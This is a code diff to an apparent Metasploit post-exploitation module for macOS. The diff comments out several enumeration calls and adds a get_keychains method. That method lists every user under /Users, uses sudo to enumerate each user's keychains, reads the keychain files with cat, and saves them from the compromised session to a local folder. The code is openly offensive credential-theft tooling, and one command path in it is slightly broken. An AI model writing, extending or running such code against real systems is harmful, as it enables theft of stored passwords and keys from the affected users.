@@ -52,12 +52,13 @@ class Metasploit3 < Msf::Post
 		end
 		ver_num = get_ver
 		log_folder = log_folder_create()
-		enum_conf(log_folder)
-		enum_accounts(log_folder, ver_num)
-		get_crypto_keys(log_folder)
-		screenshot(log_folder, ver_num)
-		dump_hash(log_folder,ver_num) if running_root
+		#enum_conf(log_folder)
+		#enum_accounts(log_folder, ver_num)
+		#get_crypto_keys(log_folder)
+		#screenshot(log_folder, ver_num)
+		#dump_hash(log_folder,ver_num) if running_root
 		dump_bash_history(log_folder)
+		get_keychains(log_folder)
 
 	end
 
@@ -529,4 +530,44 @@ class Metasploit3 < Msf::Post
 			end
 		end
 	end
+
+	# Download configured Keychains
+	def get_keychains(log_folder)
+		users = []
+		case session.type
+		when /meterpreter/
+			users_folder = cmd_exec("/bin/ls","/Users").chomp
+		when /shell/
+			users_folder = session.shell_command_token("/bin/ls /Users").chomp
+		end
+		users_folder.each_line do |u|
+			next if u.chomp =~ /Shared|\.localized/
+			users << u.chomp
+		end
+		if check_root
+			users.each do |u|
+				print_status("Enumerating and Downloading keychains for #{u}")
+				keychain_files = session.shell_command_token("/usr/bin/sudo -u #{u} -i /usr/bin/security list-keychains").split("\n")
+				keychain_files.each do |k|
+
+					keychain_file = session.shell_command_token("/bin/cat #{k.strip}")
+
+					# Save data lo log folder
+					file_local_write(log_folder+"//#{u}#{k.strip.gsub(/\W/,"_")}",keychain_file)
+				end
+			end
+		else
+			current_user = session.shell_command_token("/usr/bin/id -nu").chomp
+			print_status("Enumerating and Downloading keychains for #{current_user}")
+			keychain_files = session.shell_command_token("usr/bin/security list-keychains").split("\n")
+			keychain_files.each do |k|
+
+				keychain_file = session.shell_command_token("/bin/cat #{k.strip}")
+
+				# Save data lo log folder
+				file_local_write(log_folder+"//#{current_user}#{k.strip.gsub(/\W/,"_")}",keychain_file)
+			end
+		end
+	end
+
 end
